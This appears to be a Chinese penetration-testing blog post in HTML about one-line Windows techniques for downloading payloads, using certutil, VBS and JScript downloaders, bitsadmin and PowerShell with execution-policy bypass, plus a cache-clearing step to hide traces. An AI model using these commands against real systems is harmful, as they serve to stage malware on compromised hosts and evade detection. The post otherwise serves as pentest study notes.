@@ -1,0 +1,844 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="内网渗透,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="tusk1'Blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="certutilCertutil.exe是一个命令行程序，作为证书服务的一部分安装。您可以使用Certutil.exe转储 和显示证书颁发机构（CA）配置信息，配置证书服务，备份和还原CA组件以及验证证书， 密钥对和证书链 下载默认下载后为bin文件,但不影响执行certutil.exe -urlcache -split -f http://192.168.1.115/robots.txt 清除缓">
+<meta name="keywords" content="内网渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透测试笔记5-一句话下载payload">
+<meta property="og:url" content="http://yoursite.com/2019/10/03/渗透测试笔记5-一句话下载payload/index.html">
+<meta property="og:site_name" content="tusk1&#39;Blog">
+<meta property="og:description" content="certutilCertutil.exe是一个命令行程序，作为证书服务的一部分安装。您可以使用Certutil.exe转储 和显示证书颁发机构（CA）配置信息，配置证书服务，备份和还原CA组件以及验证证书， 密钥对和证书链 下载默认下载后为bin文件,但不影响执行certutil.exe -urlcache -split -f http://192.168.1.115/robots.txt 清除缓">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-10-03T08:40:31.625Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="渗透测试笔记5-一句话下载payload">
+<meta name="twitter:description" content="certutilCertutil.exe是一个命令行程序，作为证书服务的一部分安装。您可以使用Certutil.exe转储 和显示证书颁发机构（CA）配置信息，配置证书服务，备份和还原CA组件以及验证证书， 密钥对和证书链 下载默认下载后为bin文件,但不影响执行certutil.exe -urlcache -split -f http://192.168.1.115/robots.txt 清除缓">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/10/03/渗透测试笔记5-一句话下载payload/">
+
+
+
+
+
+  <title>渗透测试笔记5-一句话下载payload | tusk1'Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">tusk1'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/03/渗透测试笔记5-一句话下载payload/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="tusk1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="tusk1'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">渗透测试笔记5-一句话下载payload</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-03T16:37:33+08:00">
+                2019-10-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h2><p>Certutil.exe是一个命令行程序，作为证书服务的一部分安装。您可以使用Certutil.exe转储 和显示证书颁发机构（CA）配置信息，配置证书服务，备份和还原CA组件以及验证证书， 密钥对和证书链</p>
+<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>默认下载后为bin文件,但不影响执行<br>certutil.exe -urlcache -split -f <a href="http://192.168.1.115/robots.txt" target="_blank" rel="noopener">http://192.168.1.115/robots.txt</a></p>
+<h3 id="清除缓存"><a href="#清除缓存" class="headerlink" title="清除缓存"></a>清除缓存</h3><p>防止留下痕迹<br>certutil.exe -urlcache -split -f <a href="http://192.168.1.115/robots.txt" target="_blank" rel="noopener">http://192.168.1.115/robots.txt</a> delete</p>
+<h2 id="vbs"><a href="#vbs" class="headerlink" title="vbs"></a>vbs</h2><p>保存<br>downfile.vbs set a=createobject(“adod”+”b.stream”):set w=createobject(“micro”+”soft.xmlhttp”):w.open  “get”,wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile  wsh.arguments(1),2</p>
+<p>或者命令行下执行:<br>echo set a=downfile.vbs set a=createobject(“adod”+”b.stream”):set w=createobject(“micro”+”soft.xmlhttp”):w.open  “get”,wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile  wsh.arguments(1),2 &gt;&gt; downfile.vbs</p>
+<p>命令行下执行:</p>
+<blockquote>
+<blockquote>
+<p> cscript downfile.vbs <a href="http://192.168.1.115/robots.txt" target="_blank" rel="noopener">http://192.168.1.115/robots.txt</a> C:\Inetpub\b.txt</p>
+</blockquote>
+</blockquote>
+<h3 id="参数化下载"><a href="#参数化下载" class="headerlink" title="参数化下载"></a>参数化下载</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">strFileURL = &quot;http://192.168.1.115/robots.txt&quot; </span><br><span class="line">strHDLocation = &quot;c:\test\logo.txt&quot; </span><br><span class="line">Set objXMLHTTP = CreateObject(&quot;MSXML2.XMLHTTP&quot;)</span><br><span class="line"> objXMLHTTP.open &quot;GET&quot;, strFileURL, false </span><br><span class="line"> objXMLHTTP.send() </span><br><span class="line">If objXMLHTTP.Status = 200 Then </span><br><span class="line">Set objADOStream = CreateObject(&quot;ADODB.Stream&quot;) </span><br><span class="line">objADOStream.Open </span><br><span class="line">objADOStream.Type = 1 </span><br><span class="line">objADOStream.Write objXMLHTTP.ResponseBody </span><br><span class="line">objADOStream.Position = 0 </span><br><span class="line">Set objFSO = CreateObject(&quot;Scripting.FileSystemObject&quot;) </span><br><span class="line">If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocati on </span><br><span class="line">Set objFSO = Nothing </span><br><span class="line">objADOStream.SaveToFile strHDLocation </span><br><span class="line">objADOStream.Close </span><br><span class="line">Set objADOStream = Nothing </span><br><span class="line">End if </span><br><span class="line">Set objXMLHTTP = Nothing</span><br></pre></td></tr></table></figure>
+<h2 id="js"><a href="#js" class="headerlink" title="js"></a>js</h2><p>读取：  </p>
+<blockquote>
+<blockquote>
+<p>cscript /nologo downfile.js <a href="http://192.168.1.115/robots.txt" target="_blank" rel="noopener">http://192.168.1.115/robots.txt</a></p>
+</blockquote>
+</blockquote>
+<p>代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var WinHttpReq = new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span><br><span class="line">WinHttpReq.Open(&quot;GET&quot;, WScript.Arguments(0), /*async=*/false);</span><br><span class="line">WinHttpReq.Send(); </span><br><span class="line">WScript.Echo(WinHttpReq.ResponseText);</span><br></pre></td></tr></table></figure></p>
+<p>写入:</p>
+<blockquote>
+<blockquote>
+<p>cscript /nologo dowfile2.js <a href="http://192.168.1.115/robots.txt" target="_blank" rel="noopener">http://192.168.1.115/robots.txt</a></p>
+</blockquote>
+</blockquote>
+<p>代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var WinHttpReq = new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span><br><span class="line">WinHttpReq.Open(&quot;GET&quot;, WScript.Arguments(0), /*async=*/false); </span><br><span class="line">WinHttpReq.Send();</span><br><span class="line">BinStream = new ActiveXObject(&quot;ADODB.Stream&quot;);</span><br><span class="line">BinStream.Type = 1; </span><br><span class="line">BinStream.Open(); </span><br><span class="line">BinStream.Write(WinHttpReq.ResponseBody);</span><br><span class="line">BinStream.SaveToFile(&quot;micropoor.exe&quot;);</span><br></pre></td></tr></table></figure></p>
+<h2 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h2><p>自windows7以上版本内置bitsadmin，它可以在网络不稳定的状态下下载文件，出错会自动重试，在比较复杂的网络环境下，有着不错的性能。</p>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>bitsadmin /rawreturn /transfer down “<a href="http://192.168.1.115/robots.txt&quot;" target="_blank" rel="noopener">http://192.168.1.115/robots.txt&quot;</a> E:\PDF\robots.txt</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<p>需要注意的是，bitsadmin要求服务器支持Range标头。<br>如果需要下载过大的文件，需要提高优先级。配合上面的下载命令。再次执行</p>
+<blockquote>
+<blockquote>
+<p>bitsadmin /setpriority down foreground</p>
+</blockquote>
+</blockquote>
+<p>如果下载文件在1-5M之间，需要时时查看进度。同样它也支持进度条。</p>
+<blockquote>
+<blockquote>
+<p>bitsadmin /transfer down /download /priority normal   “<a href="http://192.168.1.115/robots.txt&quot;" target="_blank" rel="noopener">http://192.168.1.115/robots.txt&quot;</a> E:\PDF\robots.txt</p>
+</blockquote>
+</blockquote>
+<p>后者的话：不支持https协议。</p>
+<h2 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h2><p>自Windows7以后内置了powershell，如Windows 7中内置了PowerShell2.0,Windows 8中内置了PowerShell3.0。</p>
+<p>查看版本:  </p>
+<blockquote>
+<blockquote>
+<p>powershell $PSVersionTable</p>
+</blockquote>
+</blockquote>
+<p>脚本:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$Urls = @()</span><br><span class="line">$Urls += &quot;http://192.168.1.115/robots.txt&quot;</span><br><span class="line">$OutPath = &quot;E:\PDF\&quot; </span><br><span class="line">ForEach ( $item in $Urls)&#123; </span><br><span class="line">$file = $OutPath + ($item).split(&apos;/&apos;)[-1] </span><br><span class="line">(New-Object System.Net.WebClient).DownloadFile($item, $file)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<blockquote>
+<p>powershell C:\inetpub\down.ps1</p>
+</blockquote>
+</blockquote>
+<p>注:需要绝对路径</p>
+<p>在powershell 3.0以后，提供wget功能，既Invoke-WebRequest<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$url = &quot;http://192.168.1.115/robots.txt&quot;</span><br><span class="line">$output = &quot;C:\inetpub\robots.txt&quot;  </span><br><span class="line">$start_time = Get-Date </span><br><span class="line">Invoke-WebRequest -Uri $url -OutFile $output</span><br><span class="line">Write-Output &quot;Time : $((Get-Date).Subtract($start_time).Seconds) second(s)&quot;</span><br></pre></td></tr></table></figure></p>
+<p>一句话执行(实用):</p>
+<blockquote>
+<blockquote>
+<p>powershell -exec bypass -c (new-object  System.Net.WebClient).DownloadFile(‘<a href="http://192.168.1.115/robots.txt&#39;,&#39;E:\robots.txt&#39;" target="_blank" rel="noopener">http://192.168.1.115/robots.txt&#39;,&#39;E:\robots.txt&#39;</a>)</p>
+</blockquote>
+</blockquote>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/内网渗透/" rel="tag"># 内网渗透</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/03/渗透测试笔记4-msfvenom命令记录/" rel="next" title="渗透测试笔记4-msfvenom命令记录">
+                <i class="fa fa-chevron-left"></i> 渗透测试笔记4-msfvenom命令记录
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/10/03/渗透测试笔记6-redis写shell/" rel="prev" title="渗透测试笔记6-redis写shell">
+                渗透测试笔记6-redis写shell <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="tusk1">
+            
+              <p class="site-author-name" itemprop="name">tusk1</p>
+              <p class="site-description motion-element" itemprop="description">奋斗、寻觅，而不屈服</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=1592129863&website=www.oicqzone.com" target="_blank" title="QQ">
+                      
+                        <i class="fa fa-fw fa-globe"></i>QQ</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:tusk1@foxmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#certutil"><span class="nav-number">1.</span> <span class="nav-text">certutil</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#下载"><span class="nav-number">1.1.</span> <span class="nav-text">下载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#清除缓存"><span class="nav-number">1.2.</span> <span class="nav-text">清除缓存</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#vbs"><span class="nav-number">2.</span> <span class="nav-text">vbs</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#参数化下载"><span class="nav-number">2.1.</span> <span class="nav-text">参数化下载</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#js"><span class="nav-number">3.</span> <span class="nav-text">js</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bitsadmin"><span class="nav-number">4.</span> <span class="nav-text">bitsadmin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#powershell"><span class="nav-number">5.</span> <span class="nav-text">powershell</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">tusk1</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
